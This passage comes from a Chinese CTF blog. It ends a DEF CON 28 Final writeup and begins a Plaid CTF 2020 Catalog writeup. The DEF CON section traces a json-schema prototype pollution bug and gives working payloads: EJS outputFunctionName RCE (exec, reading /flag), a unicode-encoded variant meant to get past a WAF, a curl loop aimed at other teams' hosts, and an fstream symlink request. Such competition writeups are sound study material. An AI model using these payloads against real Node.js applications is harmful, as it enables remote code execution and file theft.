class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate an object against a schema</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkObj</span>(<span class="hljs-params">instance, objTypeDef, path, additionalProp</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">'object'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> instance != <span class="hljs-string">'object'</span> || instance <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">"an object is required"</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (objTypeDef.hasOwnProperty(i)) {</span><br><span class="line">        <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">        <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">        <span class="hljs-comment">// set default</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">"default"</span>]) {</span><br><span class="line">          value = instance[i] = propDef[<span class="hljs-string">"default"</span>];</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">          value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">        }</span><br><span class="line">        checkProp(value, propDef, path, i);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (instance.hasOwnProperty(i) &amp;&amp; !(i.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">'_'</span> &amp;&amp; i.charAt(<span class="hljs-number">1</span>) == <span class="hljs-string">'_'</span>) &amp;&amp; objTypeDef &amp;&amp; !objTypeDef[i] &amp;&amp; additionalProp === <span class="hljs-literal">false</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.filter) {</span><br><span class="line">        <span class="hljs-keyword">delete</span> instance[i];</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      } <span class="hljs-keyword">else</span> {</span><br><span class="line">        errors.push({</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">"The property "</span> + i + <span class="hljs-string">" is not defined in the schema and the schema does not allow additional properties"</span></span><br><span class="line">        });</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">var</span> requires = objTypeDef &amp;&amp; objTypeDef[i] &amp;&amp; objTypeDef[i].requires;</span><br><span class="line">    <span class="hljs-keyword">if</span> (requires &amp;&amp; !(requires <span class="hljs-keyword">in</span> instance)) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">"the presence of the property "</span> + i + <span class="hljs-string">" requires that "</span> + requires + <span class="hljs-string">" also be present"</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line">    value = instance[i];</span><br><span class="line">    <span class="hljs-keyword">if</span> (additionalProp &amp;&amp; (!(objTypeDef &amp;&amp; <span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">'object'</span>) || !(i <span class="hljs-keyword">in</span> objTypeDef))) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.coerce) {</span><br><span class="line">        value = instance[i] = options.coerce(value, additionalProp);</span><br><span class="line">      }</span><br><span class="line">      checkProp(value, additionalProp, path, i);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (!_changing &amp;&amp; value &amp;&amp; value.$schema) {</span><br><span class="line">      errors = errors.concat(checkProp(value, value.$schema, path, i));</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> errors;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>首先第一次我们会进入到 <code>checkProp</code> 函数，传入以下参数，并进行循环</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkProp(instance,instance.$schema,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>);</span><br><span class="line"><span class="hljs-comment">//instance = {"$schema": {"properties": {"__proto__": {"properties": {"path": {"default": "/flag"}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//instance.$schema = {"properties": {"__proto__": {"properties": {"path": {"default": "/flag"}}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接着在经过判断之后进入<code>checkObj</code>函数</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = {"$schema": {"properties": {"__proto__": {"properties": {"path": {"default": "/flag"}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {"__proto__": {"properties": {"path": {"default": "/flag"}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>在函数循环中，再次进入到<code>checkProp</code>函数</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">"default"</span>]){</span><br><span class="line">      value = instance[i] = propDef[<span class="hljs-string">"default"</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">      value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">    <span class="hljs-comment">//i = __proto__</span></span><br><span class="line">    <span class="hljs-comment">//value = prototype</span></span><br><span class="line">    <span class="hljs-comment">//propDDef = {"properties": {"path": {"default": "/flag"}}}</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>再次由判断进入到<code>checkObj</code>函数，传入以下参数，这时候注意<code>value</code>参数已经被指向<code>Function.prototype</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = prototype</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {"path": {"default": "/flag"}}</span></span><br><span class="line"><span class="hljs-comment">//path = "__proto__"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以当再次在这里进行赋值的时候，<code>instance</code>此时指向<code>Function.prototype</code>，参数 i 为 <code>path</code>，即被 <code>propDef['default']</code> 修改成了<code>/flag</code>，至此完成了原型链污染</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//instance = prototype</span></span><br><span class="line"><span class="hljs-comment">//objTypeDef = {"path": {"default": "/flag"}}</span></span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-comment">//i = path</span></span><br><span class="line">    <span class="hljs-comment">//value = undefined</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {"default": "/flag"}</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">"default"</span>]){</span><br><span class="line">    value = instance[i] = propDef[<span class="hljs-string">"default"</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">    value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">truetrue<span class="hljs-comment">//value = "/flag"</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {"default": "/flag"}</span></span><br><span class="line">    <span class="hljs-comment">//path = "__proto__"</span></span><br><span class="line">    <span class="hljs-comment">//i = "path"</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>整个过程这里写的比较简单，不过只要简单 debug 就可以弄明白整个流程，并不算很难。污染了 <code>path</code> 之后，就可以跟前面的一样，直接通过<code>fs.readFileSync(p.path).toString()</code>来拿 flag 了。</p><p>当然还可以污染 express ejs </p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"$schema"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"__proto__"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"outputFunctionName"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"x;return eval(\"process.mainModule.require('fs').readFileSync('/fl'+'ag').toString('base64')\");//x"</span>},<span class="hljs-attr">"path"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"/foo"</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>因为如果要污染 ejs 的话需要用到<code>res.render</code>，而在 app.js 中我们可以看到有一个错误处理的地方使用到了<code>res.render</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="hljs-string">"view engine"</span>, <span class="hljs-string">"ejs"</span>);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-comment">// error handler</span></span><br><span class="line">app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="hljs-string">"env"</span>) === <span class="hljs-string">"development"</span> ? err: {};</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="hljs-number">500</span>);</span><br><span class="line">  res.render(<span class="hljs-string">"error"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们需要一个报错来触发这个<code>res.render</code>，而我们传入的<code>"path":{"type":"string","default":"/foo"}</code>就起到了污染之前的 path 让 nodejs 读取到了一个不存在的文件引起报错，进而进入错误处理来实现 ejs 的命令执行。</p><p>所以之前对于 flat 的原型链污染也可以根据同样的原理进行 RCE ：</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"__proto__.outputFunctionName"</span>: <span class="hljs-string">"a=1;process.mainModule.require('child_process').exec('touch /tmp/b')//"</span>,<span class="hljs-attr">"__proto__.path"</span>: <span class="hljs-string">"/foo"</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>还有一些改变就是利用编码来绕过一些 waf 关键字：</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"$schema"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"__proto__"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"outputFunctionName"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"x;return eval(`\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u002e\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\\u002e\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0028\\u0060\\u0066\\u0073\\u0060\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u0046\\u0069\\u006c\\u0065\\u0053\\u0079\\u006e\\u0063\\u0028\\u0060\\u002f\\u0066\\u006c\\u0060\\u002b\\u0060\\u0061\\u0067\\u0060\\u0029\\u002e\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0060\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0060\\u0029`);//x"</span>},<span class="hljs-attr">"path"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"/foo"</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>赛后跟 /bin/tw 的选手交流了一下，他们的 payload 到后面仍然可以打好几个队，于是去要了一份 POC ，如下，也是大概类似的一个写法：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.13.37.<span class="hljs-variable">$i</span>:14017/config/validated/json-schema/validate -H <span class="hljs-string">'content-type: application/json'</span> --data <span class="hljs-string">'{"$schema":{"type":"object","properties":{"__proto__":{"type":"object","properties":{"outputFunctionName":{"type":"string","default":"x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x"},"path":{"type":"string","default":"/foo"}}}}}}'</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="fstream"><a href="#fstream" class="headerlink" title="fstream"></a>fstream</h3><p>还有一个是我们队大师傅找的</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/fstream/Writer</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 77</span><br><span class="line"></span><br><span class="line">{"type":"SymbolicLink","linkpath":"/flag","path":"public/stylesheets/11.png"}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个也没什么好分析的，文档看一看：<a href="https://github.com/npm/fstream" target="_blank" rel="noopener">https://github.com/npm/fstream</a> 就好了，这里当时我们貌似还捣鼓了一会 json 传参啥的，但是后来试了一下<code>application/x-www-form-urlencoded</code> 也可以</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><h3 id="About-The-Web"><a href="#About-The-Web" class="headerlink" title="About The Web"></a>About The Web</h3><p>这次 Web 当时比赛我们也都在吐槽，因为这个 Web 题当时觉得并不是很好，简直就直接给了一个后门，而且确实整个比赛弄起来不仅是 Web 这个后门似的洞，还有其他题目听其他大师傅吐槽也都是找后门的题目。</p><p>后面看了出题人相关的讲述，讲述视频地址：<a href="https://www.youtube.com/watch?v=g2BDz6yHcbo" target="_blank" rel="noopener">nooode DEF CON 28 CTF Challenge w/ Guest kaptain | CTF Radiooo 003</a> ，后来觉得吧，确实也还过得去，这个题目增加了一些多元化的设计，因为引入了很多 lib ，所以有很多姿势可以去尝试，可以去挖，比赛途中那次重置应该也就是加强了 checker ，也看得出 OOO 在这方面还是尽力了。（如果你删掉题目给的 node_modules ，然后重新 install 的话，会发现官方给的多出一个 vm2 ，当时我们就在想难不成还可能是 vm2 逃逸？但是后面找了一会没找到就放弃了这条路。（（因为我们当时想万一 OOO 还别有用心地再放一个后门在 node_modules 呢？毕竟 Backdooor CTF</p><p>这次虽然简单，但是确实也让我增加了一些对于如何设计 AWD Web 题目的思考，包括 @Zach Wade 也有类似的想法:</p><blockquote><p>​    Although I might sound frustrated by this, I think it’s actually an example of really good A/D problem design. Even though the application was straightforward, it presented a variety of options for exploitation.</p></blockquote><h3 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h3><p>还有一些比较有意思的事就是，A0E 的同学说，我们队的大师傅手绕 A0E 如果再多打一轮，那么这次的结果就不一样了，也因为这个保证了与 PPP 高出的两分的差距。（这难道不值得一顿饭吗？</p><p>根据一些现有的报道，以及向一些 A0E 的同学考证一些问题，比如他们真的是很早就准备了吗？真的有对每个人分特性，每个人擅长什么吗等等问题，都得到了肯定的回答，不得不佩服 A0E 的团队管理协作能力 orz 而且根据他们结束当天的合照来看估计也得有50多人左右吧。（据说 Samurai 参赛人数达到了恐怖的150人</p><p>虽然 PPP 表示自己 “Since DEF CON CTF is such an important competition for us, we traditionally spend the month leading up to it in preparation and organization. This year, we did not.” ，但是也展示出了一如既往对 DEFCON 的统治力。</p><p>自己在比赛的时候由于自身能力较差以及第一次跟大师傅们配合，当时比赛配合得不是相当的好，可能导致了一些失分，如果以后还有机会，希望自己提升能力的同时，也能尽量提高一些合作的能力。</p><p>总的来说，泡面、外卖很好吃，公司办公椅很舒服，“网管”运维选手非常给力，大师傅们都非常非常的厉害。今年对一开始的 KOH 以及最后的 Web 做了一点点微小的贡献，如果以后有机会的话希望能做到更大的贡献叭！</p><p>再次恭喜 A*0*E 拿到 DEFCON 28 CTF Final 冠军！</p><h1 id="Others-Notes"><a href="#Others-Notes" class="headerlink" title="Others Notes"></a>Others Notes</h1><p>PPP – Zach Wade 的回顾： <a href="https://dttw.tech/posts/Skww4fzGP" target="_blank" rel="noopener">Kernel Panic: A DEF CON 2020 Retrospective</a></p><p>r3kapig – Y1ng 的回顾：<a href="https://www.gem-love.com/ctf/2558.html" target="_blank" rel="noopener">DEFCON 28 CTF Final Safe Mode参赛记录</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;距离 DEFCON 28 Final 已经过去了两个多月了，本来结束就写写，但是因为一些后来事耽搁了，现在补一下这次参赛的一些经历。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Plaid CTF 2020 Catalog</title>
    <link href="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"/>
    <id>https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/</id>
    <published>2020-04-24T23:04:42.000Z</published>
    <updated>2021-09-27T17:45:58.720Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>本文是关于 Plaid CTF 2020 Catalog 题目的一些复盘与探究。</p><a id="more"></a><p>这道题是本次 PlaidCTF 全场唯一一道0解的题目，可以说是有一定的难度的，也比较有意思。这里非常感谢 @wupco @rebirthwyw @bks25wzsx（众所周知，@zsx 又名 @bks25wzsx）师傅们的指点，复盘的时候比较艰难，整个流程我会尽量用自己还算比较清晰的逻辑讲一下本道题，如果哪里有出错的还请师傅们多多包涵。</p><p>由于这个题是复盘题，所以做题思路可能会少一些，更多的是对于出题点以及exp一些分析什么的。</p><blockquote class="colorquote danger"><p>5月6日更新：作者已经放出了他的 Write Up——<a href="https://dttw.tech/posts/B19RXWzYL" target="_blank" rel="noopener">PlaidCTF 2020: Catalog Writeup</a> ，题目仓库—— <a href="https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog" target="_blank" rel="noopener">catalog</a> ，文中内容可能与作者 Write Up 有些许出入，请以作者的 Write Up 为准！本文暂未更新！</p></blockquote><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><blockquote><p><a href="http://catalog.pwni.ng/" target="_blank" rel="noopener">Here’s the site</a>. The flag is on <a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">this page</a>.</p><p>Browser: Chromium <strong>with uBlock Origin 1.26.0 installed and in its default configuration</strong></p><p>Flag format: <code>/^PCTF\{[A-Z0-9_]+\}$/</code></p><p><strong>Hints</strong>:</p><ul><li>To view your post, the admin will click on a link on the admin page.</li><li>You might want to read up on User Activation.</li><li>The intended solution does not require you to submit hundreds of captchas.</li></ul><p>Hint: Admin Bot Timeout</p><p>The admin bot will always disconnect after about 30 seconds.    </p></blockquote><p>给没有看题的小伙伴简略地概括一下题目，题目是个黑盒，有登录注册、发表 issue 、提交 issue 给 admin 看，主要是这些功能，很明显题目需要我们进行 XSS</p><p>其中有几个细节漏洞：</p><ol><li><p>登录失败的时候会直接无过滤地回显用户名，这里有一处 HTML 注入</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXW